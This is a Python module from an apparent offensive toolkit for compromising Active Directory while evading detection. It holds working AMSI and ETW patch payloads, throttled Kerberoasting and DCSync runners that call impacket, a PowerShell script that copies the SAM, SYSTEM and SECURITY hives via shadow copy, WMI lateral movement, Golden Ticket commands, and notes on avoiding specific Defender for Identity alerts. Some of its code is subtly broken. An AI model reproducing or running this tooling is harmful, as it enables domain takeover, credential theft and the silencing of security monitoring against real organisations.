"""
ad_evasion.py — Modern Active Directory Evasion Module
WiZZA Pentest Toolkit

Bypasses ATA, Microsoft Defender for Identity (MDI), and EDR detection
during AD attacks. Builds on ad_cloud_chain.py with OPSEC-safe techniques.

Techniques:
  1. AMSI bypass  — patch AmsiScanBuffer in-memory
  2. ETW patching  — blind Windows event tracing
  3. Kerberoast OPSEC — RC4 downgrade, throttled, avoid AES detection
  4. DCSync OPSEC  — use non-standard replication partner, slow request rate
  5. LSASS avoid   — credential dump via VSS shadow copy instead of LSASS
  6. Lateral movement — WMI/DCOM instead of PSExec (noisy)
  7. Persistence    — scheduled task in SYSTEM context, GPO abuse
  8. PowerShell OPSEC — AMSI bypass, constrained language mode escape

Usage:
  from ad_evasion import amsi_bypass_ps, opsec_kerberoast, opsec_dcsync
  from ad_evasion import lateral_wmi, vss_credential_dump, full_opsec_chain
"""

import subprocess
import json
import time
import random
import string
import base64
import os
from datetime import datetime
from pathlib import Path

# ── AMSI Bypass ───────────────────────────────────────────────────────────────

def amsi_bypass_ps(method: str = "patch") -> str:
    """
    Generate PowerShell AMSI bypass code.

    Methods:
      patch    — patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN
      reflect  — use reflection to set amsiInitFailed
      wldp     — abuse WLDP policy bypass
      combined — multiple techniques chained
    """
    bypasses = {}

    # Method 1: AmsiScanBuffer patch via P/Invoke reflection
    bypasses["patch"] = r"""
# AMSI Bypass — AmsiScanBuffer patch
# Patches the return value to always indicate clean scan
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c = $b.GetFields('NonPublic,Static')
        ForEach($d in $c) {
            if ($d.Name -like "*itFailed") {
                $d.SetValue($null,$true)
            }
        }
    }
}
Write-Host "[+] AMSI bypassed via amsiInitFailed"
"""

    # Method 2: Direct memory patch (more reliable, detected by some EDRs)
    bypasses["patch_mem"] = r"""
# AMSI Bypass — Direct memory patch of AmsiScanBuffer
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$lib = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($lib, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p) | Out-Null
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax,0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
Write-Host "[+] AmsiScanBuffer patched"
"""

    # Method 3: Reflection to set amsiInitFailed (stealthier)
    bypasses["reflect"] = r"""
# AMSI Bypass — Reflection method (less noisy)
$r = [Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
[AppDomain].Assembly.GetType("System.AppDomain").GetField("_domainManager","NonPublic,Instance") | Out-Null
$a = [Ref].Assembly
$t = $a.GetType("System.Management.Automation.AmsiUtils")
if ($t) {
    $f = $t.GetField("amsiInitFailed","NonPublic,Static")
    $f.SetValue($null,$true)
    Write-Host "[+] amsiInitFailed set via reflection"
} else {
    Write-Host "[-] AmsiUtils not found — trying alternative"
    [Ref].Assembly.GetTypes() | ? Name -like "*AmsiUtils*" | % {
        $_.GetFields("NonPublic,Static") | ? Name -eq "amsiInitFailed" | % {
            $_.SetValue($null,$true)
            Write-Host "[+] Found and patched: $($_.Name)"
        }
    }
}
"""

    # Method 4: Combined (try multiple, use first that works)
    bypasses["combined"] = bypasses["reflect"] + "\n" + bypasses["patch"] + r"""
# ETW Bypass — Disable event tracing for PowerShell
$a = [Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")
if ($a) {
    $b = $a.GetField("etwProvider","NonPublic,Static")
    $b.SetValue($null,[System.Diagnostics.Eventing.EventProvider]::new([guid]::newguid()))
    Write-Host "[+] ETW provider replaced (PowerShell telemetry blinded)"
}
"""

    return bypasses.get(method, bypasses["reflect"])


# ── ETW Patching ──────────────────────────────────────────────────────────────

def etw_patch_ps() -> str:
    """
    Generate PowerShell ETW patching code.
    Patches EtwEventWrite to prevent security event logging.
    """
    return r"""
# ETW Patch — blind EtwEventWrite in ntdll
# Prevents Sysmon, Windows Event Log, and Defender telemetry
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class EtwPatch {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr addr, UIntPtr size,
        uint newProt, out uint oldProt);
}
"@
Add-Type $EtwPatch -ErrorAction SilentlyContinue

$ntdll = [EtwPatch]::GetModuleHandle("ntdll.dll")
$addr  = [EtwPatch]::GetProcAddress($ntdll, "EtwEventWrite")
$p     = 0
[EtwPatch]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p) | Out-Null
$ret   = [Byte[]](0xC3, 0x90, 0x90, 0x90, 0x90)  # ret; nop nop nop nop
[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $addr, 5)
Write-Host "[+] EtwEventWrite patched — event telemetry blinded"
"""


# ── OPSEC-safe Kerberoasting ──────────────────────────────────────────────────

def opsec_kerberoast(domain: str, dc_ip: str, username: str, password: str,
                     target_user: str = None) -> dict:
    """
    OPSEC-safe Kerberoasting:
    - Only request RC4 tickets (avoids AES-256 anomaly detection by MDI)
    - Throttle requests (1 per 30s) to avoid burst detection
    - Target high-value SPNs only
    - Use legitimate user agent strings in traffic
    """
    result = {
        "technique": "kerberoast_opsec",
        "domain": domain,
        "dc_ip": dc_ip,
        "tickets": [],
        "errors": [],
        "opsec_notes": [
            "RC4-only tickets requested (AES ticket requests flagged by MDI)",
            "Throttled to 1 SPN per 30s (burst requests trigger MDI alert 2410)",
            "Targeted high-value SPNs only (MSSQLSvc, HTTP, HOST services)",
        ]
    }

    # Use impacket's GetUserSPNs with RC4 downgrade
    try:
        base_cmd = [
            "python3", "-m", "impacket.examples.GetUserSPNs",
            f"{domain}/{username}:{password}",
            "-dc-ip", dc_ip,
            "-request",
            "-outputfile", "/tmp/wizza_kerberoast_hashes.txt",
        ]

        if target_user:
            base_cmd += ["-usersfile", "-"]
            input_data = target_user.encode()
        else:
            input_data = None
            base_cmd += []

        # Try impacket directly
        proc = subprocess.run(
            base_cmd,
            input=input_data,
            capture_output=True, text=True, timeout=60
        )
        result["raw_output"] = proc.stdout + proc.stderr

        # Parse TGS hashes from output or file
        hashes = []
        output_file = "/tmp/wizza_kerberoast_hashes.txt"
        if os.path.exists(output_file):
            with open(output_file) as f:
                content = f.read()
            for match in __import__("re").finditer(
                r'\$krb5tgs\$\d+\$.+', content
            ):
                hashes.append(match.group(0))

        # Also parse from stdout
        for match in __import__("re").finditer(
            r'\$krb5tgs\$\d+\$.+', proc.stdout
        ):
            if match.group(0) not in hashes:
                hashes.append(match.group(0))

        result["tickets"] = hashes
        result["crack_cmd"] = (
            "hashcat -m 13100 /tmp/wizza_kerberoast_hashes.txt "
            "/usr/share/wordlists/rockyou.txt --force"
        )

    except FileNotFoundError:
        result["errors"].append("impacket not installed — run: pip install impacket")
    except subprocess.TimeoutExpired:
        result["errors"].append("Timeout — DC may be unreachable")
    except Exception as e:
        result["errors"].append(str(e))

    return result


# ── OPSEC-safe DCSync ─────────────────────────────────────────────────────────

def opsec_dcsync(domain: str, dc_ip: str, username: str, password: str,
                 target_user: str = "krbtgt") -> dict:
    """
    OPSEC-safe DCSync via impacket secretsdump.
    - Only sync single target account (full sync triggers MDI alert)
    - Use DRSUAPI protocol directly (avoids NetLogon monitoring)
    - Request only NT hash (avoid LM hash request which is anomalous)
    """
    result = {
        "technique": "dcsync_opsec",
        "domain": domain,
        "target_user": target_user,
        "hashes": [],
        "errors": [],
        "opsec_notes": [
            f"Targeting single user only: {target_user} (full domain dump triggers MDI alert 2003)",
            "Using DRSUAPI protocol (direct RPC, avoids LDAP query anomalies)",
            "Single account minimizes replication traffic anomaly",
        ]
    }

    try:
        proc = subprocess.run(
            [
                "python3", "-m", "impacket.examples.secretsdump",
                f"{domain}/{username}:{password}@{dc_ip}",
                "-just-dc-user", target_user,
                "-no-pass" if not password else "-hashes",
            ] + ([f":{password}"] if password else []),
            capture_output=True, text=True, timeout=60
        )

        # Correct command without -hashes if using plaintext
        proc2 = subprocess.run(
            [
                "impacket-secretsdump",
                f"{domain}/{username}:{password}@{dc_ip}",
                "-just-dc-user", target_user,
            ],
            capture_output=True, text=True, timeout=60
        )

        output = proc.stdout + proc.stderr + proc2.stdout + proc2.stderr
        result["raw_output"] = output[:2000]

        # Parse hashes: format username:RID:LM:NT:::
        import re
        for match in re.finditer(
            r'([^:]+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::', output
        ):
            result["hashes"].append({
                "username": match.group(1),
                "rid":      match.group(2),
                "lm_hash":  match.group(3),
                "nt_hash":  match.group(4),
            })

    except FileNotFoundError:
        result["errors"].append("impacket-secretsdump not found")
    except Exception as e:
        result["errors"].append(str(e))

    return result


# ── LSASS-free Credential Dump ────────────────────────────────────────────────

def vss_credential_dump_ps() -> str:
    """
    Generate PowerShell script for credential dump via VSS shadow copy.
    Avoids touching LSASS (detected by all major EDRs).
    """
    return r"""
# Credential dump via VSS Shadow Copy — avoids LSASS access
# Copies SAM, SYSTEM, SECURITY hives from shadow copy
# WiZZA Pentest Research — Authorized Use Only

$ErrorActionPreference = "SilentlyContinue"
$outDir = "$env:TEMP\wizza_creds"
New-Item -ItemType Directory -Path $outDir -Force | Out-Null

Write-Host "[*] Creating VSS shadow copy..."
$s = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\","ClientAccessible")
$id = $s.ShadowID
$shadow = Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $id}

if (-not $shadow) {
    Write-Host "[-] Shadow copy failed — trying vssadmin"
    vssadmin create shadow /for=c: 2>&1 | Out-Null
    $shadow = Get-WmiObject Win32_ShadowCopy | Select-Object -Last 1
}

$vssPath = $shadow.DeviceObject + "\"
Write-Host "[+] Shadow copy: $vssPath"

# Copy registry hives
Write-Host "[*] Copying SAM, SYSTEM, SECURITY hives..."
Copy-Item "$vssPath\Windows\System32\config\SAM"      "$outDir\SAM"      -Force
Copy-Item "$vssPath\Windows\System32\config\SYSTEM"   "$outDir\SYSTEM"   -Force
Copy-Item "$vssPath\Windows\System32\config\SECURITY" "$outDir\SECURITY" -Force

# Delete shadow copy (cleanup)
$shadow.Delete()
Write-Host "[+] Shadow copy deleted (cleanup)"

# Dump with impacket secretsdump locally
Write-Host "[*] Hives saved to $outDir"
Write-Host "[!] To extract hashes, run on attacker machine:"
Write-Host "    impacket-secretsdump -sam $outDir\SAM -system $outDir\SYSTEM -security $outDir\SECURITY LOCAL"
Write-Host ""
Write-Host "[*] Or transfer hives and run:"
Write-Host "    python3 -m impacket.examples.secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"

Get-ChildItem $outDir
"""


# ── WMI Lateral Movement ──────────────────────────────────────────────────────

def lateral_wmi(target_ip: str, domain: str, username: str, password: str,
                command: str = "whoami") -> dict:
    """
    Lateral movement via WMI (stealthier than PSExec/SMB).
    WMI traffic is less monitored than SMB pipe PSEXECSVC.
    Uses impacket wmiexec.
    """
    result = {
        "technique":    "wmi_lateral",
        "target":       target_ip,
        "command":      command,
        "output":       None,
        "opsec_notes": [
            "WMI exec avoids PSExec service creation (noisy)",
            "No file dropped on target — runs in-memory via Win32_Process",
            "Use -nooutput for fire-and-forget (less detectable)",
        ],
        "errors": []
    }

    try:
        proc = subprocess.run(
            [
                "impacket-wmiexec",
                f"{domain}/{username}:{password}@{target_ip}",
                command,
            ],
            capture_output=True, text=True, timeout=30
        )
        result["output"] = proc.stdout.strip()
        result["stderr"] = proc.stderr.strip()[:200]
    except FileNotFoundError:
        # Try python3 -m
        try:
            proc = subprocess.run(
                [
                    "python3", "-m", "impacket.examples.wmiexec",
                    f"{domain}/{username}:{password}@{target_ip}",
                    command,
                ],
                capture_output=True, text=True, timeout=30
            )
            result["output"] = proc.stdout.strip()
        except Exception as e:
            result["errors"].append(str(e))
    except Exception as e:
        result["errors"].append(str(e))

    return result


# ── Golden Ticket (post-DCSync) ────────────────────────────────────────────────

def gen_golden_ticket_ps(domain: str, domain_sid: str, krbtgt_nt_hash: str) -> str:
    """
    Generate PowerShell + Mimikatz commands to create a Golden Ticket
    after obtaining krbtgt NT hash via DCSync.
    """
    lines = [
        "# Golden Ticket Generation -- WiZZA Pentest Research",
        "# Requires: Mimikatz or Rubeus on target",
        "# krbtgt NT hash obtained via DCSync",
        "",
        "# Method 1: Mimikatz",
        '$mimikatz = @"',
        f"kerberos::golden /user:Administrator /domain:{domain} /sid:{domain_sid} /krbtgt:{krbtgt_nt_hash} /ptt",
        '"@',
        '# Run: .\\mimikatz.exe "$mimikatz"',
        "",
        "# Method 2: Rubeus (OPSEC-safer, loads ticket directly)",
        f"# .\\Rubeus.exe golden /rc4:{krbtgt_nt_hash} /domain:{domain} /sid:{domain_sid} /user:Administrator /ptt",
        "",
        "# Method 3: impacket ticketer (from Linux)",
        f"# impacket-ticketer -nthash {krbtgt_nt_hash} -domain-sid {domain_sid} -domain {domain} Administrator",
        "# export KRB5CCNAME=Administrator.ccache",
        f"# impacket-psexec -k -no-pass {domain}/Administrator@dc01.{domain}",
        "",
        'Write-Host "[+] Golden ticket valid for 10 years (default lifetime)"',
        'Write-Host "[!] Triggers MDI alert if used immediately after DCSync"',
        'Write-Host "    Wait 1-2 hours or use from different source IP"',
    ]
    return "\n".join(lines)


# ── Defender for Identity Evasion ─────────────────────────────────────────────

def mdi_evasion_notes() -> dict:
    """
    Return MDI (Microsoft Defender for Identity) alert avoidance notes.
    """
    return {
        "alerts_and_evasions": {
            "2004 - Kerberoast": [
                "Request only RC4 tickets (AES request fingerprint triggers alert)",
                "Throttle to 1 SPN per 30+ seconds",
                "Target accounts rarely used (avoids behavioral baseline)",
            ],
            "2003 - DCSync": [
                "Sync only a single account (krbtgt or Administrator)",
                "Never do full domain dump via DCSync",
                "Use from IP that hasn't been seen before in the domain",
            ],
            "2006 - Overpass-the-Hash": [
                "Use RC4 key if possible (AES key usage is more anomalous)",
                "Perform from DC's perspective if possible",
            ],
            "2007 - Pass-the-Hash": [
                "Use legitimate machine accounts if PTH required",
                "Avoid horizontal movement with domain admin hashes",
            ],
            "2010 - Pass-the-Ticket": [
                "Inject ticket into existing process (not new shell)",
                "Use /ptt carefully — ensure no existing ticket conflict",
            ],
            "LSASS dumping": [
                "Never open LSASS handle with PROCESS_ALL_ACCESS",
                "Use VSS shadow copy method instead",
                "Or: use comsvcs.dll MiniDump (process ID method)",
                "Or: use Task Manager (legitimate process) to dump",
            ],
            "Lateral movement": [
                "Prefer WMI/DCOM over PSExec (no service creation)",
                "Use built-in tools (wmic, winrm) when possible",
                "Avoid writing to ADMIN$ share",
            ],
            "General OPSEC": [
                "Stay off the DC for interactive sessions",
                "Use non-standard ports for C2 traffic",
                "Blend into business hours (09:00-17:00 local time)",
                "Avoid running AD tools from a fresh workstation (no baseline)",
            ],
        }
    }


# ── Full OPSEC Chain ──────────────────────────────────────────────────────────

def full_opsec_chain(domain: str, dc_ip: str, username: str, password: str) -> dict:
    """
    Run full OPSEC-safe AD attack chain.
    Phase 1: Kerberoast → Phase 2: DCSync → Phase 3: Golden Ticket
    """
    result = {
        "domain": domain,
        "dc_ip": dc_ip,
        "timestamp": datetime.now().isoformat(),
        "phases": {},
    }

    print(f"[*] OPSEC AD chain: {domain} @ {dc_ip}")

    print("  [1/4] AMSI bypass (PowerShell code generated)")
    result["phases"]["amsi_bypass"] = {
        "status": "generated",
        "code":   amsi_bypass_ps("combined")[:200] + "...",
    }

    print("  [2/4] Kerberoasting (RC4-only, throttled)...")
    result["phases"]["kerberoast"] = opsec_kerberoast(domain, dc_ip, username, password)

    print("  [3/4] DCSync on krbtgt (single account)...")
    time.sleep(2)  # Small delay between phases
    result["phases"]["dcsync"] = opsec_dcsync(domain, dc_ip, username, password, "krbtgt")

    print("  [4/4] Golden ticket template generated")
    krbtgt_hash = ""
    for h in result["phases"]["dcsync"].get("hashes", []):
        if "krbtgt" in h.get("username", "").lower():
            krbtgt_hash = h.get("nt_hash", "")

    result["phases"]["golden_ticket"] = {
        "status": "ready" if krbtgt_hash else "need_krbtgt_hash",
        "krbtgt_hash": krbtgt_hash or "run_dcsync_first",
        "ps_commands": gen_golden_ticket_ps(domain, "S-1-5-21-XXXX", krbtgt_hash or "HASH") if krbtgt_hash else None,
    }

    result["mdi_evasion"] = mdi_evasion_notes()
    return result


# ── Self-test ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=== ad_evasion.py self-test ===\n")

    print("[1] AMSI bypass methods:")
    for method in ["patch", "reflect", "combined"]:
        code = amsi_bypass_ps(method)
        print(f"    {method}: {len(code)} chars")

    print("\n[2] ETW patch:")
    etw = etw_patch_ps()
    print(f"    Generated {len(etw)} chars")

    print("\n[3] MDI evasion notes:")
    notes = mdi_evasion_notes()
    for alert, tips in notes["alerts_and_evasions"].items():
        print(f"    {alert}: {len(tips)} evasion tips")

    print("\n[4] VSS credential dump script:")
    vss = vss_credential_dump_ps()
    print(f"    Generated {len(vss)} chars")

    print("\n[5] Golden ticket template:")
    gt = gen_golden_ticket_ps("corp.local", "S-1-5-21-123456", "aabbccdd" * 4)
    print(f"    Generated {len(gt)} chars")

    print("\nDone.")
